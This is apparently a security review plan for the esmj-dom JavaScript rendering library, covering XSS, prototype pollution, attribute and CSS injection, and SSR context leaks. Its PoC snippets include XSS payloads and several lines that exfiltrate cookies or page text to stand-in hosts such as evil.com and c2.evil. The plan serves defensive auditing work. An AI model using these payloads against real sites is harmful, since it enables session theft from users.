# Security Analysis Plan — esmj-dom runtime & createElement

## Scope
Files under review:
- `src/runtime.mjs`
- `src/createElement.mjs`
- `src/mount.mjs`

The reviewing agent must assess each item below, determine severity (Critical / High / Medium / Low / Info), confirm whether the issue is exploitable in realistic usage, and propose a concrete fix or mitigation. For each item an **attacker scenario** and a **PoC snippet** are provided.

---

## 1. XSS via `innerHTML` (Critical priority)

### 1a. `$dangerouslySetInnerHTML` in `createElement.mjs`
- **Location:** `applyInnerContent()`, called from `applyProps()` key `$dangerouslySetInnerHTML`
- **Risk:** Directly assigns unsanitized strings to `element.innerHTML`. Any developer who passes user-supplied data here will cause stored/reflected XSS.
- **Check:** Is there any sanitization layer (e.g., DOMPurify) applied before `element.innerHTML = value`? There is none today.
- **Proposed fix:** Either (a) enforce that only `DocumentFragment` is accepted (ban raw-string path), or (b) auto-sanitize the string via `setHTMLUnsafe`/`DOMPurify.sanitize` before assignment, or (c) keep current behavior but throw a lint-time warning if a plain string is used directly without a sanitizer wrapper.

**Attacker scenario:** A forum app fetches a post body from an API and renders it directly:
```js
// developer writes this innocently:
const post = await fetchPost(id); // post.body = "<img src=x onerror=alert(document.cookie)>"
createElement('div', { $dangerouslySetInnerHTML: post.body });
// → element.innerHTML = "<img src=x onerror=alert(document.cookie)>"
// → session cookie is stolen
```
If the prop is reactive (signal), an attacker who can update the signal value (e.g. via a WebSocket message) can inject script at any time after mount.

### 1b. `container.innerHTML = ''` in `mount.mjs`
- **Location:** `mount()` lines 30–38, `unmount()` lines 67–68

#### Finding 1b-A — Container-level disposer leak on remount (High)

`mount()` loops over direct children and calls `cleanupTree(child)` — but **never calls `cleanupTree(container)`**. Signal effects attached to the container itself via `addDisposer(container, dispose)` (which `createReactiveNode` does for every reactive child) are **never disposed on remount**. Those effects become zombies: they keep running, hold references to detached comment anchors, and attempt to re-insert nodes into the detached DOM.

```js
// First mount: reactive child → createReactiveNode(container, fn)
//              → addDisposer(container, effectDispose)
//              → container[NODE_INTERNAL].disposers = [effectDispose]
mount('#app', () => signalA.get());

// Route change — second mount on the same container:
mount('#app', () => signalB.get());
// → cleanup loop runs cleanupTree on each direct child (comment anchor, text node)
// → container[NODE_INTERNAL].disposers = [effectDispose] ← NEVER TOUCHED
// → effectDispose from signalA still fires on every signalA update forever
// → it tries to insert a node after a detached comment anchor → silent DOM corruption
```

#### Finding 1b-B — TypeError crash: remount after `unmount()` (Critical bug)

`unmount()` calls `cleanupTree(container)` which sets `container[NODE_INTERNAL].disposers = null`. A subsequent `mount()` on the same container creates a reactive child, which calls `addDisposer(container, dispose)`:

```js
// runtime.mjs addDisposer:
export function addDisposer(element, disposer) {
  let internal = getNodeInternal(element);     // returns { disposers: null, id: 'xxx' }
  if (!internal) { internal = initNodeInternal(element); }
  internal.disposers.push(disposer);           // ← TypeError: null.push is not a function
}
```

`initNodeInternal` returns the existing `NODE_INTERNAL` (because `element[NODE_INTERNAL]` is still set — only `.disposers` was nulled), so the fresh-internal branch is never taken. The `.push()` on `null` throws → **the entire remount crashes**.

```js
unmount('#app');
mount('#app', () => someSignal.get()); // ← throws TypeError
```

#### Finding 1b-C — `onUnmount` DOM mutation injects uncleanable nodes (Medium)

The cleanup loop in `mount()` fires `cleanupTree(child)` → `runUnmountHooks` → user `onUnmount` callbacks. If a hook appends new children to the container during iteration:

```js
onUnmount(() => {
  container.appendChild(transitionPlaceholder); // "play exit animation"
});
```

`transitionPlaceholder` is added AFTER the cleanup loop has already advanced past that position. `container.innerHTML = ''` then removes it with **zero lifecycle cleanup** — its signal effects and disposers never run → zombie effects.

#### Finding 1b-D — No error isolation in cleanup (Medium)

`cleanupTree` has no try/catch around disposer calls:
```js
for (const dispose of internal.disposers) {
  dispose(); // if this throws, all subsequent disposers are skipped
}
```
One misbehaving plugin disposer silently prevents all following cleanups → leaked effects for every component that comes after it in tree order.

---

### 1c. Text nodes vs `innerHTML`
- **Location:** `renderChild()`, `createReactiveNode()` in `createElement.mjs`

#### Finding 1c-A — Reactive Node insertion: event handlers pass through untouched (High)

In `createReactiveNode`, when the reactive function/signal returns a DOM Node, it is inserted directly with **zero sanitization**:

```js
if (value instanceof Node) {
  newNode = value;   // ← any Node, including one with onerror/onclick handlers
}
anchor.after(newNode);
```

An attacker who can update a signal value to a crafted element achieves XSS:

```js
// Developer exposes a signal via context for child components to update:
const [widget, setWidget] = createSignal(null);
setContext(WidgetCtx, setWidget);
createElement('div', {}, widget);

// A third-party widget (CDN script, plugin, iframe postMessage handler) calls:
const evil = document.createElement('img');
evil.src = 'x';
evil.addEventListener('error', () => fetch('https://c2.evil/?c=' + document.cookie));
setWidget(evil);
// → img is inserted → error fires immediately → session stolen
```

This is especially dangerous because the developer-written code looks completely safe — the `<div>` renders text content, signals look like plain values — the vulnerability only manifests when an untrusted upstream can write to the signal.

#### Finding 1c-B — `clearContainer` does not dispose parent-level effects (Medium)

`createReactiveNode(parent, fn)` stores the effect disposer on **`parent`** via `addDisposer(parent, dispose)` and stores the comment anchor in the DOM as a child of `parent`.

`clearContainer(parent)` iterates `parent.childNodes` and calls `cleanupTree(child)` on each — including the comment anchor — but **never touches `parent[NODE_INTERNAL].disposers`**. The reactive effect is never disposed, yet the anchor it controls is gone:

```js
clearContainer(myContainer);
// → comment anchor removed from DOM, currentNode removed
// → but the effect() is still active
// → next signal update → effect runs → tries anchor.after(newNode)
// → anchor is detached → newNode is inserted into a detached tree → invisible DOM corruption
```

`clearContainer` is designed as an internal tool for `If`/`Each` but this asymmetry is a trap for any caller.

#### Finding 1c-C — Cross-realm `instanceof Node` fails silently (Low)

Both `renderChild` and `createReactiveNode` use `value instanceof Node`. Nodes created in a different JS realm (e.g. `iframeEl.contentWindow.document.createElement('div')`) fail this check:

```js
// child was created in an iframe:
const foreignNode = iframeEl.contentDocument.createElement('div');
foreignNode.innerHTML = '<b>rich content</b>';
renderChild(container, foreignNode);
// → instanceof Node → false
// → falls through all checks to final fallback:
//    parent.appendChild(document.createTextNode(String(foreignNode)))
// → renders "[object HTMLDivElement]" as text — component silently broken
```

Not XSS, but leads to invisible rendering failures in portal/micro-frontend architectures.

#### Finding 1c-D — ComponentInstance returned from reactive slot rendered as `[object Object]` (Low)

In `createReactiveNode`, if the reactive function returns a `ComponentInstance` descriptor (i.e. the result of `createElement(MyComponent, props)`), it fails all three checks:

```js
// Not instanceof Node (it's a plain object)
// Not null/false/true
// → falls to: newNode = document.createTextNode(String(value))
// → renders "[object Object]" — silent failure, no error thrown
```

Developers composing dynamic component trees reactively will get a blank render with no diagnostic. The fix is to add an `isComponentInstance` branch inside `createReactiveNode`, just as `renderChild` has one.

---

## 2. Prototype Pollution

### 2a. `normalizeProps` iterates `Object.keys(props)` (Medium)
- **Location:** `runtime.mjs` `normalizeProps()`
- **Risk:** If `props` originates from JSON.parse or a spread of untrusted data, a key like `__proto__` or `constructor` could pollute `Object.prototype` via `result[key] = value`.
- **Check:** Does `Object.keys()` expose `__proto__`? (No, but `Object.assign` or bracket assignment can.) Verify `result[key] = value` is safe when `key === '__proto__'`.
- **Proposed fix:** Use `Object.create(null)` for `result`, or add an explicit `hasOwnProperty`/allowlist guard.

**Attacker scenario:** A server returns component props from a database column that the user controls:
```js
// Attacker submits a JSON body: {"__proto__": {"isAdmin": true}}
const propsFromServer = JSON.parse(attackerControlledJSON);
// JSON.parse DOES create a key "__proto__" on the parsed object in some engines
normalizeProps(propsFromServer);
// result["__proto__"] = createSignal({"isAdmin": true})
// → Object.prototype.isAdmin is now a signal on every plain object in the app
// → downstream isAdmin checks that use obj.isAdmin may now return truthy
```

### 2b. `deepEqual` recursive key comparison (Low)
- **Location:** `runtime.mjs` `deepEqual()`
- **Check:** `Object.keys(a).every(k => deepEqual(a[k], b[k]))` — if `a` has a key `__proto__`, this recurses into the prototype chain. Verify no pollution path.

**Attacker scenario:** Attacker crafts an item array fed to `Each` where one item is `{ "__proto__": { toString: () => "pwned" } }`. `deepEqual` traverses the key `__proto__`, calling `deepEqual(a.__proto__, b.__proto__)` — walking the prototype chain rather than own properties, potentially causing infinite recursion or prototype confusion.

---

## 3. DOM Clobbering via arbitrary `setAttribute`

### 3a. Unrestricted attribute names (High)
- **Location:** `applyProps()` — the static-attribute fallback calls `element.setAttribute(key, value)` for any key not explicitly handled.
- **Risk:** An attacker-controlled prop key could set `srcdoc`, `src`, `href`, `action`, `formaction`, `xlink:href`, `data-*` with javascript: URIs, or override security-relevant attributes (`integrity`, `crossorigin`, `nonce`, `sandbox`).
- **Check:** Is there an allowlist or denylist for attribute names? Currently none.
- **Proposed fix:** Introduce a denylist of dangerous attribute names (`srcdoc`, `src` on script/iframe, `href` when value starts with `javascript:`, etc.) or require explicit opt-in for raw attributes.

**Attacker scenario — javascript: href on an anchor:**
```js
// Attacker controls the props object (e.g. from a CMS that stores link targets):
const attackerProps = { href: "javascript:fetch('https://evil.com/?c='+document.cookie)" };
createElement('a', attackerProps, 'Click me');
// → <a href="javascript:...">Click me</a>
// → user clicks → cookie exfiltration
```

**Attacker scenario — nonce override to bypass CSP:**
```js
// App renders a script with a valid nonce from the server:
createElement('script', { src: '/app.js', nonce: serverNonce });
// Attacker can craft props = { nonce: '' } to strip the nonce → browser rejects the script
// OR attacker sets integrity="" to strip SRI and load a tampered script
createElement('script', { src: '/app.js', integrity: '' });
```

**Attacker scenario — srcdoc on iframe to embed arbitrary HTML:**
```js
// Developer spreads user-supplied attributes onto an iframe:
const userAttrs = JSON.parse(req.body.attrs); // {"srcdoc": "<script>alert(1)</script>"}
createElement('iframe', { ...userAttrs });
// → srcdoc loads attacker's HTML in the iframe context
```

### 3b. `on*` event handler dynamic binding (High)
- **Location:** `applyProps()` — any key starting with `on` + function value is bound as an event listener via `addEventListener`.
- **Risk:** Legitimate pattern, but verify that the event-name derivation `key.slice(2).toLowerCase()` cannot be abused to attach handlers to unusual events (e.g., `onSecurityPolicyViolation`, `onMessage` on iframes).
- **Check:** No filtering of event names; confirm this is intentional or add a warning for rarely-used events.

**Attacker scenario:** Attacker injects a prop key into an element to silently intercept security events:
```js
// Attacker supplies props with onSecurityPolicyViolation to suppress CSP reports:
createElement('div', {
  onSecurityPolicyViolation: (e) => { e.stopImmediatePropagation(); }
});
// → legitimate CSP violation listeners never fire → attacker can inject scripts undetected
```

---

## 4. `useRef` Proxy — Arbitrary DOM Property Write (Medium)

- **Location:** `runtime.mjs` `useRef()` — the Proxy `set` trap writes `current[prop] = value` when `prop` is not on the `ref` target itself.
- **Risk:** Anyone holding a `ref` can write arbitrary properties to the underlying DOM element (e.g., `ref.innerHTML = '<img onerror=...>'`, `ref.src = 'javascript:...'`). This is intentional by design but is a footgun.
- **Check:** Verify there is no path where `ref` is exposed to untrusted code.
- **Proposed fix:** Consider sandboxing the Proxy to a property allowlist, or document the risk prominently.

**Attacker scenario — XSS via ref passed as a context value:**
```js
// Parent component exposes its ref through context (common pattern):
const inputRef = useRef();
setContext(InputRefContext, inputRef);

// In a child component (or a plugin/widget loaded from a CDN):
const ref = getContext(InputRefContext);
ref.innerHTML = '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">';
// → XSS fires inside the parent's input element
```

**Attacker scenario — redirect via ref.src on an image:**
```js
const logoRef = useRef();
// Third-party analytics script gets the ref from a public API:
logoRef.src = 'https://tracker.evil.com/pixel.gif?data=' + encodeURIComponent(document.body.innerText);
// → full page text exfiltrated as a side-channel via image request
```

---

## 5. Module-Level Mutable Shared State (Medium)

- **Location:** `runtime.mjs` `_currentComponentContext`, `mountHooksRegistry`, `unmountHooksRegistry`, `disposersRegistry`
- **Risk:** Module-level singletons are shared across all components in the same JS realm. In SSR (Node.js) or multi-tenant micro-frontend scenarios this can cause context leakage between requests/tenants.
- **Check:** Is `withContext` always restoring the previous context in a finally block? (Yes it is.) But verify no async code path can break the synchronous context stack assumption.
- **Proposed fix:** Document that `withContext` is not safe across async boundaries; consider adding an AsyncLocalStorage-based path for SSR.

**Attacker scenario — SSR context leak between concurrent requests:**
```js
// Node.js SSR handler (two concurrent requests):
// Request A (user=alice) and Request B (user=bob) render simultaneously.

// Request A sets internal context with alice's session:
setInternalContext({ userId: 'alice', contexts: new Map() });

// Event loop yields to Request B (async gap — e.g. await db.query()):
await fetchUserData(); // ← context is still alice's at module level

// Request B sets context to bob:
setInternalContext({ userId: 'bob', contexts: new Map() });

// Request A resumes — getInternalContext() now returns BOB's context
const ctx = getInternalContext(); // { userId: 'bob' } ← WRONG
setContext(AuthContext, aliceToken);
// → alice's auth token is stored in BOB's context map → bob gets alice's session
```

**Attacker scenario — hook registry poisoning in microfrontend:**
```js
// Micro-frontend A mounts, registers 1000 fake disposers into disposersRegistry
// under a guessed componentId (easy-uid IDs may be predictable):
for (let i = 0; i < 1000; i++) {
  addToRegistry(disposersRegistry, 'known-id-001', () => { /* no-op */ });
}
// → when component 'known-id-001' from Micro-frontend B unmounts,
//    its disposers list is polluted with 1000 attacker no-ops and true disposers
//    are buried, causing signal effects to leak (DoS / memory exhaustion)
```

---

## 6. CSS Injection via `style` Prop (Low–Medium)

- **Location:** `applyProps()` `style` handling — `element.setAttribute('style', value)` for plain strings.
- **Risk:** If `value` is user-controlled, attackers can inject `expression()` (IE), `url()` with javascript: (legacy browsers), or pointer-events manipulation.
- **Check:** Is `element.style.cssText = value` safer than `setAttribute('style', value)`? Verify whether the string path is reachable from user input.
- **Proposed fix:** Prefer `Object.assign(element.style, parsedObject)` and deprecate the raw-string style path, or sanitize via CSS.escape.

**Attacker scenario — clickjacking via pointer-events + z-index:**
```js
// App renders a user-customizable widget where the user can set a style string:
const userStyle = req.query.style; // "pointer-events:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:rgba(0,0,0,0)"
createElement('div', { style: userStyle });
// → a full-screen transparent overlay is injected, stealing all clicks
// → combined with a phishing iframe behind it = clickjacking attack
```

**Attacker scenario — data exfiltration via CSS url():**
```js
// On older browsers or certain CSS preprocessors:
const evilStyle = "background:url('https://evil.com/?secret=" + document.cookie + "')";
createElement('div', { style: evilStyle });
// → browser requests the evil URL, leaking cookies in the request log
```

---

## 7. Symbol-Keyed Data on DOM Elements (Info / Design Risk)

- **Location:** `runtime.mjs` `NODE_COMPONENT`, `NODE_INTERNAL` — stored directly as `element[symbol]`
- **Risk:** Low in isolation, but expandos on DOM elements can cause memory leaks if elements are removed without cleanup (disposers not run). Verify that `cleanupTree` (lifecycle.mjs) always clears these.
- **Check:** Confirm `cleanupTree` nulls out `element[NODE_INTERNAL]` and `element[NODE_COMPONENT]` to release GC references.

**Attacker scenario — DoS via memory exhaustion through repeated mount/unmount:**
```js
// Attacker (or buggy third-party plugin) mounts and unmounts a heavy component tree
// in a tight loop WITHOUT triggering cleanupTree (e.g. by writing element.remove()
// directly instead of using unmount()):
for (let i = 0; i < 10_000; i++) {
  const el = createElement('div', {}, bigTree);
  document.body.appendChild(el);
  el.remove(); // bypasses cleanupTree → NODE_INTERNAL with signal disposers stays alive
}
// → 10,000 signal effects and disposer arrays accumulate in memory → tab crashes
```

---

## 8. `keepLiteral` Bypass of Signal Wrapping (Info)

- **Location:** `runtime.mjs` `keepLiteral()` + `normalizeProps()`
- **Risk:** `keepLiteral` lets developers pass raw functions as props. If that function is user-supplied (e.g., an API response parsed as `new Function()`), it bypasses reactive safety checks.
- **Check:** Document clearly that `keepLiteral` must only be used with developer-controlled functions, never with user data.

**Attacker scenario — code injection via keepLiteral + dynamic function creation:**
```js
// Developer naively evaluates a "callback" string from an API to allow
// configurable behavior (a known anti-pattern, but it happens):
const config = await fetchComponentConfig(); // {"onClick": "() => fetch('https://evil.com/?c='+document.cookie)"}
const fn = new Function('return ' + config.onClick)(); // attacker controls this string

createElement('button', {
  onClick: keepLiteral(fn), // bypasses computed() wrapping
});
// → attacker's function is wired directly as a click handler
// → any user click exfiltrates cookies
```

**Attacker scenario — keepLiteral value leaks signal tracking:**
```js
// Developer accidentally uses keepLiteral on a reactive getter:
const [secret, setSecret] = createSignal('');
createElement('div', {
  onFocus: keepLiteral(secret.get), // passes secret.get as raw fn, not computed
});
// → onFocus handler returns the raw signal accessor; if the element is
//    accessible to a third-party script, the script can call el.onfocus()
//    to read the current secret value without the reactive dependency being tracked
```

---

## 9. `getContextFromElement` DOM Tree Walk (Low)

- **Location:** `runtime.mjs` `getContextFromElement()` — walks `node.parentElement` upward.
- **Risk:** If called on a node inside a cross-origin iframe (unlikely but possible in portals), `parentElement` traversal could unexpectedly leak into the outer document.
- **Check:** Verify this function is never called with nodes from untrusted origins.

**Attacker scenario — context theft via injected child node:**
```js
// Attacker (via XSS in a sub-component that allows raw HTML) injects a node
// into the app tree, then calls getContextFromElement on it:
const injectedNode = document.querySelector('#attacker-controlled-node');

// If the injected node is placed inside a provider component:
// <AuthProvider>          ← sets AuthContext = { token: 'SECRET' }
//   <div id="attacker-controlled-node" />
// </AuthProvider>

const authCtx = getContextFromElement(AuthContext, injectedNode);
// → authCtx.token === 'SECRET'
// → attacker reads the auth token by walking up to the provider's NODE_INTERNAL
fetch('https://evil.com/?t=' + authCtx.token);
```

**Attacker scenario — portal node escapes shadow boundary:**
```js
// A portal renders content into document.body, outside the component tree.
// If getContextFromElement is called on that portal node,
// parentElement walk reaches document.body then <html> then null —
// but if any ancestor element was given a NODE_INTERNAL by a different app
// (microfrontend), the wrong app's context is returned.
```

---

## 10. Dependency Supply-Chain Risk (Medium)

- **Dependencies:** `@esmj/signals`, `easy-uid`
- **Check:** Run `npm audit`. Verify `easy-uid` does not use `Math.random()` in a security-sensitive way (UIDs used as component IDs in `initNodeInternal` — if predictable, could enable DOM-lookup attacks).
- **Proposed fix:** If UIDs need to be non-guessable, replace with `crypto.randomUUID()`.

**Attacker scenario — predictable UID allows hook registry poisoning:**
```js
// easy-uid uses Math.random() internally (verify!).
// An attacker on the same page (e.g. a third-party ad script) can seed
// Math.random to a known state before the app boots:
const origRandom = Math.random;
let callCount = 0;
Math.random = () => {
  callCount++;
  return callCount * 0.0001; // deterministic sequence
};

// App mounts — easy-uid generates predictable IDs: "0001", "0002", ...
mount('#app', createElement(App, {}));

Math.random = origRandom; // restore

// Attacker now knows the component IDs and can poison their hook registries:
mountHooksRegistry.set('0001', [() => { stealData(); }]);
// → when component '0001' mounts/remounts, attacker's hook fires
```

**Attacker scenario — compromised `easy-uid` package (supply chain):**
```js
// If easy-uid is compromised (typosquat or dependency confusion attack),
// a malicious version could:
// 1. Return the same UID for all components → all components share one
//    NODE_INTERNAL → disposers from one component run on unrelated unmounts
// 2. Exfiltrate component IDs to a remote server to enable targeted hook poisoning
// 3. Inject code that runs inside withContext, gaining access to all context values
```

---

## Deliverables expected from the reviewing agent

For each numbered item above:
1. **Confirmed / Not Applicable** — is the issue present?
2. **Severity rating** (re-assess if needed)
3. **Exploitability** — realistic attack scenario or "theoretical only"
4. **Recommended fix** — concrete code change or architectural guidance
5. **PoC snippet** — minimal reproduction when applicable

Priority order for fixes: 1a → 3a → 4 → 2a → 6 → rest.
